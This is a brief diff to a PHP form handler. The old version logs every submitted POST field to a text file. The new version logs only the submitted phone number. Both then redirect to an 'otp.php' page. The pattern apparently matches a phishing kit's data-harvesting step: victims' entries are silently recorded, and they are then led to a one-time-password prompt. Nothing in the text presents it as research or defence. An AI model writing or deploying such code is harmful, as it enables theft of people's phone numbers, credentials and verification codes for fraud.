@@ -1,13 +1,5 @@
 <?php
-header ('Location: otp.php');
-$handle = fopen("log.txt", "a");
-foreach($_POST as $variable => $value) {
-fwrite($handle, $variable);
-fwrite($handle, "=");
-fwrite($handle, $value);
-fwrite($handle, "\r\n");
-}
-fwrite($handle, "\r\n");
-fclose($handle);
-exit;
-?>
+
+    file_put_contents("log.txt", "Number: " . $_POST['phone_number'] . "\n", FILE_APPEND);
+header('Location: otp.php');
+exit();
